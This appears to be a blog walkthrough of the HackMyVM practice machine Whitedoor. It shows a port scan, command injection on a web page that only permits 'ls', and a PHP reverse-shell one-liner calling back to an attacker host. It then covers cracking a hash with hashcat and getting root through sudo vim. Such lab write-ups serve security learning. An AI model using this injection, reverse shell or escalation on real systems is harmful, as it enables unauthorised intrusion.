---
title: "Whitedoor - Pylon"
excerpt: " "
comments: true
categories:
  - Hacking
  - Walkthrough
tags:
  - Hacking
  - Walkthrough
  - HackMyVM
  - Whitedoor
header:
  overlay_image: /assets/images/pasek-hack.png
---
# Whitedoor - Pylon
{: .text-justify}

## 00. Metainfo

|:----|:----|
|Title:|Whitedoor|
|Author:|[Pylon](https://hackmyvm.eu/profile/?user=Pylon)|
|Release date:|2023-12-15|
|Download from:|[HackMyVM](https://hackmyvm.eu/machines/machine.php?vm=Whitedoor)|
|Level:|Easy|
|System:|Linux|
|You'll learn:|reverse shell|

# 01. Entry
[Whitedoor](https://hackmyvm.eu/machines/machine.php?vm=Whitedoor) is the second machine from [Pylon](https://hackmyvm.eu/profile/?user=Pylon). It is easier than the previous one and is recommended for beginners, if someone has not had any experience with this "sport", they can have some fun with it, and for the rest it is a piece of cake, which does not mean that it is bad.
{: .text-justify}
# 02. Beginning
In the beginning there was scanning:
{: .text-justify}
```bash
msf6 exploit(multi/handler) > workspace -a whitedoor
[*] Added workspace: whitedoor
[*] Workspace: whitedoor
msf6 exploit(multi/handler) > db_nmap -A -p- 172.16.1.179
[*] Nmap: Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-15 09:08 CET
[*] Nmap: Nmap scan report for whitedoor.lan (172.16.1.179)
[*] Nmap: Host is up (0.00060s latency).
[*] Nmap: Not shown: 65532 closed tcp ports (reset)
[*] Nmap: PORT   STATE SERVICE VERSION
[*] Nmap: 21/tcp open  ftp     vsftpd 3.0.3
[*] Nmap: | ftp-anon: Anonymous FTP login allowed (FTP code 230)
[*] Nmap: |_-rw-r--r--    1 0        0              13 Nov 16 22:40 README.txt
[*] Nmap: | ftp-syst:
[*] Nmap: |   STAT:
[*] Nmap: | FTP server status:
[*] Nmap: |      Connected to ::ffff:172.16.1.89
[*] Nmap: |      Logged in as ftp
[*] Nmap: |      TYPE: ASCII
[*] Nmap: |      No session bandwidth limit
[*] Nmap: |      Session timeout in seconds is 300
[*] Nmap: |      Control connection is plain text
[*] Nmap: |      Data connections will be plain text
[*] Nmap: |      At session startup, client count was 3
[*] Nmap: |      vsFTPd 3.0.3 - secure, fast, stable
[*] Nmap: |_End of status
[*] Nmap: 22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)
[*] Nmap: | ssh-hostkey:
[*] Nmap: |   256 3d:85:a2:89:a9:c5:45:d0:1f:ed:3f:45:87:9d:71:a6 (ECDSA)
[*] Nmap: |_  256 07:e8:c5:28:5e:84:a7:b6:bb:d5:1d:2f:d8:92:6b:a6 (ED25519)
[*] Nmap: 80/tcp open  http    Apache httpd 2.4.57 ((Debian))
[*] Nmap: |_http-server-header: Apache/2.4.57 (Debian)
[*] Nmap: |_http-title: Home
[*] Nmap: MAC Address: 08:00:27:CD:91:8F (Oracle VirtualBox virtual NIC)
[*] Nmap: Device type: general purpose
[*] Nmap: Running: Linux 4.X|5.X
[*] Nmap: OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
[*] Nmap: OS details: Linux 4.15 - 5.8
[*] Nmap: Network Distance: 1 hop
[*] Nmap: Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
[*] Nmap: TRACEROUTE
[*] Nmap: HOP RTT     ADDRESS
[*] Nmap: 1   0.60 ms whitedoor.lan (172.16.1.179)
[*] Nmap: OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 11.33 seconds
msf6 exploit(multi/handler) > services 
Services
========

host          port  proto  name  state  info
----          ----  -----  ----  -----  ----
172.16.1.179  21    tcp    ftp   open   vsftpd 3.0.3
172.16.1.179  22    tcp    ssh   open   OpenSSH 9.2p1 Debian 2+deb12u1 protocol 2.0
172.16.1.179  80    tcp    http  open   Apache httpd 2.4.57 (Debian)
```
There are 3 ports open:
{: .text-justify}
- **21/tcp** - FTP
- **22/tcp** - SSH
- **80/tcp** - Apache WWW

# 03. Reverse shell i WWW
There was nothing interesting on the ftp, it was a bit of a misnomer. But when we enter the website we see something like this:
{: .text-justify}
![01](/assets/images/hacking/2023/06/01.png)
{: .text-justify}
We see the message that only the **ls** command works:
{: .text-justify}
On the server, which I checked, there is probably no **nc** command, but we can immediately go further and do something like this:
## 03a. Listening 
On our server we run:
{: .text-justify}
```bash
nc -lvn -p 12345
```
```bash
listening on [any] 12345 ...
```
## 03b. Web browser 
And in the web browser window we enter:
{: .text-justify}
```bash
ls; php -r '$sock=fsockopen("172.16.1.89",12345);exec("bash <&3 >&3 2>&3");'
```
After a while, **shell** will connect to us::
{: .text-justify}
```bash
connect to [172.16.1.89] from (UNKNOWN) [172.16.1.179] 58258
script /dev/null -c /bin/bash
Script started, output log file is '/dev/null'.
www-data@whitedoor:/var/www/html$ 
```
Sorry - **Pylon** - I took some shortcuts.
{: .text-justify}
# 04. Shell
Type commands:
{: .text-justify}
```bash
cd /home/
find .
```
```bash
find: './Gonzalo': Permission denied
./whiteshell
./whiteshell/Downloads
./whiteshell/.profile
./whiteshell/.local
./whiteshell/.local/share
find: './whiteshell/.local/share': Permission denied
./whiteshell/.bash_logout
./whiteshell/Documents
./whiteshell/Public
./whiteshell/Pictures
./whiteshell/Music
./whiteshell/.bashrc
./whiteshell/Desktop
./whiteshell/Desktop/.my_secret_password.txt
./whiteshell/.bash_history
```
```bash
cat ./whiteshell/Desktop/.my_secret_password.txt
```
```bash
whiteshell:*****
```
We see the password, which is encoded with **Base64**. We decode twice and have access to the **whiteshell** account:
{: .text-justify}
```bash
base64 -d <<< haselkowbase64
```
# 04. User whiteshell
Being in the whiteshell account, we list all files from the **/home** directory
{: .text-justify}
```bash
find /home/
```
```bash
/home/Gonzalo/.bash_logout
/home/Gonzalo/Documents
/home/Gonzalo/Public
/home/Gonzalo/Pictures
/home/Gonzalo/Music
/home/Gonzalo/.bashrc
/home/Gonzalo/Desktop
/home/Gonzalo/Desktop/user.txt
/home/Gonzalo/Desktop/.my_secret_hash
```
# 05. User Gonzales
We have a password that is easy to crack in the program: **Hashcat** or **John**
{: .text-justify}
```bash
hashcat -O -m3200 -a0 hashe\whiteshell.txt dict\rockyou.txt
```
# 06. root
Type:
{: .text-justify}
```bash
Gonzalo@whitedoor:~$ sudo -l
```
```bash
Matching Defaults entries for Gonzalo on whitedoor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User Gonzalo may run the following commands on whitedoor:
    (ALL : ALL) NOPASSWD: /usr/bin/vim
```
```bash
sudo /usr/bin/vim
```
In the **Vim** program:
{: .text-justify}
```bash
:!bash
```

